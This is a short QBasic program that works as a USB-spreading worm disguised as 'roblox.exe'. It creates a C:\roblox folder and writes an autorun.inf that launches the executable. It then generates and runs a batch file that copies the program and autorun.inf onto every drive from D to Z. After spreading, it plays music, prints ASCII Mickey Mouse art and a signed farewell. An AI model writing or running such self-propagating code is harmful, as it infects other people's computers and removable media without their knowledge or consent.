On Error GoTo doesnotexist
ChDir "C:\roblox"
Call usb
Call playmusic
End
doesnotexist:
Call MySub
Resume Next
End
Sub MySub
    Cls ' Clear screen
    MkDir "C:\roblox"
    Open "c:\roblox\autorun.inf" For Output As #1 ' Open the file for output
    Print #1, "[AutoRun]" ' Send characters to the file
    Print #1, "OPEN=roblox.exe" ' Send characters to the file
    Shell "copy roblox.exe c:\roblox"

End Sub

Sub usb
    Dim batchFile As String
    batchFile = "c:\roblox\usb_copy.bat" ' Path to the batch file

    ' Create the batch file
    Open batchFile For Output As #1
    Print #1, "@echo off"
    Print #1, "for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do ("
    Print #1, "  if exist %%d:\ ("
    Print #1, "    copy roblox.exe %%d:\"
    Print #1, "    copy c:\roblox\autorun.inf %%d:\"
    Print #1, "  )"
    Print #1, ")"
    Close #1

    ' Execute the batch file
    Shell batchFile
End Sub

Sub playmusic
    Play "mb"
    Play "o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c# o1 c e d# d c# o2 c e d# d c#"
    Width 80, 25 ' works in QuickBasic, QBASIC, and QB64.
    Cls
    Color 4
    Print "...--@@+++=:...............@.:=+++-............."
    Print ".-#@@@@@%%#-............=%@@@@%%#*:.."
    Print "-%@@@@@@@@@@*..........#@@@@@@@@@%#-..."
    Print "@@@@@@@@@@@@@:........-@@@@@@@@@@@%#:.."
    Print ":@@@@@@@@@@@@@-........+@@@@@@@@@@@@@:"
    Print "*@@@@@@@@@@@@#--*@@*--#@@@@@@@@@@@@+.."
    Print ":*@@@@@@@@@%=----------+@@@@@@@@@@*:..."
    Print ":*@@@@@@#-------------=@@@@@@@#:....."
    Print ".....-@@*---****-=+--*-+----*@@-..."
    Print ".....@@%=---****=.:=:***..=---+@@....."
    Print "....=@@@+----:***=:*:***---+@@@:...."
    Print "....+@@@*---+*%-*@-----#.---..@..."
    Print "....:@+:----=-=++=------=%@..@@@..."
    Print ".....@--------@@@@%+------:-...@.."
    Print "......@=---=----===---------:.@..."
    Print ".......@.=---===------=-=---:@.."
    Print "........@:---#%%%%%%=---:...@...."
    Print "..........@..-==++=-:.....@...."
    Print ".............@@...@@.:=@@-:...."
    Print "That is Mickey Mouse... This artwork is maybe"
    Print "the greatest achievement of my life. Goodbye."
    Print "Best Regards,"
    Print "mr.loser AKA lollyboy142"
End Sub





